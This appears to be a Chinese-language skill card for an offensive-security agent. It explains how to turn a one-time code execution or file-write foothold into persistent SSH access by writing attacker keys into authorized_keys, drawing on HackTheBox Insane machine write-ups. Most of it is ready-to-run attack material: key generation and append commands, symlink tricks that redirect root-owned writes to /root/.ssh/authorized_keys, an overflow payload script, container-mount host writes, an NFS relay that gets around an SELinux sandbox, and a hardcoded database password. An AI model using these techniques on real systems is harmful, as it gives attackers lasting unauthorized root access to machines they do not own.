---
name: 'authorized-keys-landing'
description: '拿到一次性 RCE / 任意文件写 / 溢出写原语后,把执行权固化成 SSH 登录的唯一入口卡:直接可写、符号链接接力、溢出/注入型写入、跨边界(NFS/容器挂载/打包-解包-覆盖)。反弹 shell 回不来或会话一断就没时先看这张。（检索词：authorized_keys/ssh-keygen/public key/SSH key persistence/符号链接/symlink attack/软链接/公钥落地/SSH 登录/持久化/反弹 shell 替代/ssh keygen/public-key/SSH-key-persistence/symlink-attack/authorized keys/authorized-keys/landing）'
whenToUse: '已经拿到命令执行或任意文件写,但反弹 shell 被拦/不稳定,或需要一条能穿过出站限制的稳定通道时加载'
metadata: { domain: linux, tier: T2 }
---

# 写 `authorized_keys` 落地:把一次性执行变成稳定 SSH 登录

> 来自 Insane 官方 WP 逐台回核,**13 台命中**:Jail / Smasher2 / Fatty / Dyplesher / Laser / CrossFit / Rope / RopeTwo / Stacked / Bookworm / Ouija / Derailed / MagicGardens

## 触发信号

- 已有 RCE / 命令注入 / 溢出写原语,但**反弹 shell 回不来**(出站被封)或会话一断就没
- `nmap` 见 `22/tcp OpenSSH`,当前立足点却没有该用户口令
- 有个**以更高权限运行、会写文件**的东西:root cron、SUID、以 root 跑的插件/Lua/PHP 扩展
- 任意写原语**只控内容不控路径**,或反过来**只控路径不控内容**
- 可写目录/挂载(NFS、`/var/local`、`/opt/...`)且目标家目录下 `.ssh` **已存在**;或容器能看见宿主目录(`docker run -v /:/mnt`);或宿主会解包容器产物并用 `scp` 覆盖同名文件
- 溢出点里栈上有个**文件名/路径缓冲区**被 `strcpy` 覆盖

## 前置验证

```bash
nmap -p22 -sV <ip>; grep -Ei 'permitrootlogin|pubkeyauth' /etc/ssh/sshd_config
ls -ld /root/.ssh /home/<user>/.ssh   # 🔴 必须已存在,SSH 不会替你创建
mount | grep -E ' / | /var | nfs'     # 只读挂载 = 白忙
touch /path/canary && echo WRITABLE || echo NO
getenforce; sysctl fs.protected_symlinks   # 🔴 =1 时 sticky 目录里符号链接不被跟随
```

## 最小落地序列

```bash
ssh-keygen -t rsa -b 2048 -f ./id_rsa -q -N ""; cat id_rsa.pub   # 整行 = authorized_keys 的一行
mkdir -p ~/.ssh && chmod 700 ~/.ssh
cat id_rsa.pub >> ~/.ssh/authorized_keys     # 🔴 必须 >>,用 > 会抹掉目标原有公钥
chmod 600 ~/.ssh/authorized_keys
chmod 600 id_rsa && ssh -i id_rsa <user>@<ip> -o StrictHostKeyChecking=no
```

## 为什么不用反弹 shell

- 反弹的生命周期 = 那次会话;`authorized_keys` 是**文件系统上的状态**,落地即持久。反弹又走**出站**,最容易被防火墙吃掉——Dyplesher 的 `ProcessBuilder` 反弹被拦,改 `FileWriter` 写 key 才通。
- 沙箱限制的是**进程能力**而非文件可见性:Jail 在 SELinux 沙箱里经 NFS 写 `/home/frank/.ssh/authorized_keys`;换来的是完整 TTY(`-L/-R/-D` 全可用)。代价:sshd 在跑 + `.ssh` 已存在 + 有可写路径。

## 模式 1: 直接可写(含高权服务代写)

立足点自身,或它调用的服务进程,就有写目标家目录的权限。

```bash
# Laser:solr shell 里自产自销
ssh-keygen; cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys; cat ~/.ssh/id_rsa
```

| 机器 | 细节 |
|------|------|
| Laser | Solr Velocity RCE 拿 `solr` → `ssh-keygen` + `cp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys` |
| Dyplesher | PlugMan 插件(属主 MinatoTW)`new FileWriter("/home/MinatoTW/.ssh/authorized_keys")`;AMQP Lua 以 root `io.open("/root/.ssh/authorized_keys","wb+")` |
| Smasher2 | API `job` 命令注入拿 `dzonery` → `ssh-keygen` 写入其 `authorized_keys` |
| Derailed | Ruby `open(report_log)` 的 `\|` 前缀起子进程拿 `rails` → 写 key,`ssh rails@10.10.11.190` |
| RopeTwo | V8 越界 + XSS 拿 `chromeuser` → 写 `~/.ssh/authorized_keys`;`r4j` 同法(Rope 的 `john` 同理) |

## 模式 2: 符号链接接力(可控文件名 + 高权写入)

高权进程按一个**我能预测或命名**的文件名去写,而该路径可被我创建。

```bash
# CrossFit:dbmsg 以 root 写 /var/local/<md5("%d%s", rand(), row_id)>
/* rand.c 片段:seed = 下一分钟整点 + 61s(cron 在 hh:mm:01 跑) */
time_t t = time(NULL); srand(t - (t % 60) + 61); printf("%d", rand());
# 内容要"恰好是 authorized_keys 的一行":dbmsg 拼的是 <name> <message> <email>
mysql -u crossfit -p"oeLoo~y2baeni" crossfit -e "insert into messages(id,name,email,message) values(1337,'ssh-rsa','root@kali','<公钥>')"
ln -s /root/.ssh/authorized_keys /var/local/<md5>   # 让将要被写的文件名指向 root 公钥
```

🔴 链接**位置**决定成败:Bookworm 直接指 `/home/neil/.ssh/authorized_keys` 得 404、在 `/tmp` 建链接得 500(`fs.protected_symlinks=1`),改在 `frank` 家目录 `mkdir test; chmod 777 test; ln -s /home/neil/.ssh/authorized_keys test/auth.txt` 才 200 OK。

| 机器 | 细节 |
|------|------|
| CrossFit | `dbmsg` 以 root 打开 `/var/local/<md5>`(实为符号链接),三列拼接恰好等于 `authorized_keys` 的一行 |
| Fatty | 容器内 `ln -s /root/.ssh/authorized_keys logs.tar`,宿主解包留下同名链接,`echo "ssh-rsa AAAA..." > /opt/fatty/tar/logs.tar` 后 `scp` 覆盖写入宿主 `/root/.ssh/authorized_keys` |
| Bookworm | 家目录内符号链接写 `/home/neil/.ssh/authorized_keys`;另有 PostScript `/outfile (/root/.ssh/authorized_keys)` |

## 模式 3: 溢出 / 注入型写入(路径与内容都在 payload 里)

漏洞点里既有"可覆盖的文件路径",又有"可控制的写入内容"。

```python
# Ouija:lverifier.so 把 size_t 长度截成 short,65535 字节用户名覆盖栈上 log_path/log_data
p  = "A" * 16 + "/root/.ssh/authorized_keys\n" + "B" * 85 + "\n<pub_key>\n"
p += "C" * (65535 - len(p))
requests.post('http://127.0.0.1:9999/index.php', data={'username': p, 'password': 'password'})
# MagicGardens:harvest 的 IPv6 UDP 包超 65360 缓冲 → 栈溢出覆盖日志路径
payload = b"A" * 12 + pub_key + b"/home/alex/.ssh/authorized_keys"   # 前 12 字节被吃掉,需多补
```

| 机器 | 细节 |
|------|------|
| Ouija | `lverifier.so` `size_t`→`short` 截断,65535 字节用户名覆盖 `log_path`,写 root 公钥 |
| MagicGardens | `harvest` IPv6 包超缓冲栈溢出,覆盖日志路径为 `/home/alex/.ssh/authorized_keys`(须本地走 loopback 发包) |
| Bookworm | PostScript 注入 `/outfile (/root/.ssh/authorized_keys)` |

## 模式 4: 跨边界接力(NFS / 容器挂载 / 打包-解包-覆盖)

写入发生在"另一侧",落点却是我要的用户。盯住:**谁写、写在哪、写的是什么**。

```bash
# Jail:沙箱内进程能力受限,但 NFS 共享可写 —— 用独立通道写宿主文件
# NFSShell: host 10.10.10.34 → mount /var/nfsshare
cp id_rsa.pub /var/nfsshare/   # exploit 改为 cp /var/nfsshare/id_rsa.pub /home/frank/.ssh/authorized_keys
# 在 pwntools 会话里执行 /var/nfsshare/writeup,再本地 ssh -i id_rsa frank@10.10.10.34
# Stacked:容器把宿主根挂进来
docker run -v /:/mnt ...; echo "ssh-rsa AAAA..." >> /mnt/root/.ssh/authorized_keys
```

| 机器 | 细节 |
|------|------|
| Jail | 可写 NFS `/var/nfsshare` → 借沙箱内执行点写 `/home/frank/.ssh/authorized_keys`,**绕过 SELinux 沙箱** |
| Stacked | 容器 `-v /:/mnt` 直写宿主 `/mnt/root/.ssh/authorized_keys` |
| Fatty | 跨边界判定模板:建 symlink → 宿主解包 → 定时 `scp` 覆盖,三环缺一不可 |

## 快速检查清单

```bash
[ ] 22/tcp 开着?PubkeyAuthentication / PermitRootLogin 允许?
[ ] ls -ld /root/.ssh /home/<user>/.ssh; mount | grep -E 'ro,|nfs'
[ ] sysctl fs.protected_symlinks; getenforce
[ ] 高权写入者的文件名我能预测吗?内容格式我能控吗?(两者都要)
[ ] 落地用 >> 不用 >;chmod 600;失败看 /var/log/auth.log
```

## 教训

1. **落地 = 路径可控 + 内容可控,缺一不可**。CrossFit 两者齐备:文件名靠可预测 `rand()`,内容靠"三列拼接恰好等于一行公钥"。
2. **内容格式本身就是原语**:`authorized_keys` 一行 = `<算法> <base64> <注释>`,任何把"我控的三段"按空格拼起来的写入点都值得试。
3. **符号链接的位置比链接本身重要**:sticky + `fs.protected_symlinks=1` 让 `/tmp` 里的链接失效,换到家目录下可写的子目录即可;别用 `>` 覆盖,`>>` 才是可逆操作。
4. **沙箱限制能力,不限制可见性**:Jail 的 SELinux 拦不住经 NFS 的写入;反过来 Cobblestone 的 AppArmor 连 `bash`/`nc` 都 `deny`,那里反弹 shell 才真走不通。⚠️ 旧统计记为"9 台"且列入了未核实到写入的 Cobblestone/Reddish;按官方 WP 正文核对,实际是上列 13 台。

## 相关卡

- `symlink-attack-patterns` —— 模式 2 的符号链接原语详解(可预测文件名/解包穿越/`/proc` 软链)
- `persistence`(落地后怎么驻留)/ `cron-privesc-patterns`(模式 2 上游:高权任务会写什么)/ `nfs-privesc` / `container-escape`(模式 4 的 NFS 侧与容器侧)
- `linux-binary-stack-rop`(模式 3 的溢出侧)/ `tunneling-port-forwarding`(sshd 不可达时的替代通道)
